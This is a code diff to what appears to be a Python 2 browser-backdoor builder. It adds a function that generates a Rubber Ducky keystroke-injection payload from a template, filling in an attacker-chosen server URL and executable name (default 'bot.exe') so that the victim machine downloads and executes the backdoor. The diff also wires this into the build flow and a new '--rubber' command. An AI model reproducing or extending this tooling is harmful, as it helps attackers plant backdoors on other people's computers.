@@ -19,6 +19,34 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
+def ducky_payload():
+    print bcolors.OKBLUE + "[+] Generate Rubber Ducky payload..." + bcolors.ENDC
+    if os.path.exists("backdoor/rubber_ducky/payload.chromebackdoor"):
+	open_file = open("backdoor/rubber_ducky/payload.chromebackdoor").read()
+	if not os.path.exists("payload.txt"):
+	    open_payload = open("payload.txt", "a+")
+	    user_input = raw_input("Domain directory (http://localhost.com/dir/)$ ")
+	    if user_input == "":
+		domain = "http://localhost/dir/"
+	    else:
+		if not user_input.endswith('/'):
+		    user_input = user_input + "/"
+		domain = user_input
+	    user_input = raw_input("Executable name (bot.exe)$ ")
+	    if user_input == "":
+		executable = "bot.exe"
+	    else:
+		executable = user_input
+	    content = open_file.replace("%server%", domain)
+	    content = content.replace("%exe%", executable)
+	    open_payload.write(content)
+	    open_payload.close()
+	    print bcolors.OKGREEN + "[+] Payload created : " + os.getcwd() + "/payload.txt" + bcolors.ENDC
+	else:
+	    print bcolors.FAIL + "[!] Payload already here please delete " +os.getcwd() + "/payload.txt" + bcolors.ENDC
+    else:
+	print bcolors.FAIL + "[-] Payload maker not found" + bcolors.ENDC
+
 def logon():
     print """
        ____ _                              ____             _       _                  
@@ -261,11 +289,14 @@ def compile_payload(type):
 		shutil.rmtree(old_folder)
 		walls = 1
 		print bcolors.OKGREEN+"Generate successful : "+os.getcwd()+"/bot.exe"+bcolors.ENDC
+		user_input = raw_input("Generate Rubber Ducky payload [y/N]? $ ")
+		if user_input == "Y" or user_input == "y":
+		    ducky_payload()
     except:
 	print "["+bcolors.WARNING+"-"+bcolors.ENDC+"] Please install wine32"
 
 def executable_silent():
-    user_input = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] backdoor type (--chrome,--firefox,--ie) ? ")
+    user_input = raw_input("["+bcolors.OKBLUE+"?"+bcolors.ENDC+"] backdoor type(--chrome,--ie) ? $ ")
     if user_input == "" or user_input == "--chrome":
 	action = 0
 	while action == 0:
@@ -522,8 +553,11 @@ def help():
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --build   : generate silent executable"
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --payload : show available payloads"
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --binder  : compact extension to extension"
+	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --rubber  : create Rubber Ducky download & execute"
 	print "--------------------------------------------"
-
+	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] exemple:"
+	print "|   usage : python " + sys.argv[0] + " [CMD]"
+	print "\n"
 def main():
     if(len(sys.argv) > 1):
         if(sys.argv[1] == "--chrome"):
@@ -536,13 +570,11 @@ def main():
 	    iexplorer()
 	elif(sys.argv[1] == "--payload"):
 	    show_plugins()
+	elif(sys.argv[1] == "--rubber"):
+	    ducky_payload()
 	else:
 	    help()
     else:
 	help()
-        print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] exemple:"
-	print "|   usage : python " + sys.argv[0] + " [CMD]"
-	print "\n"
-
 logo()
 main()
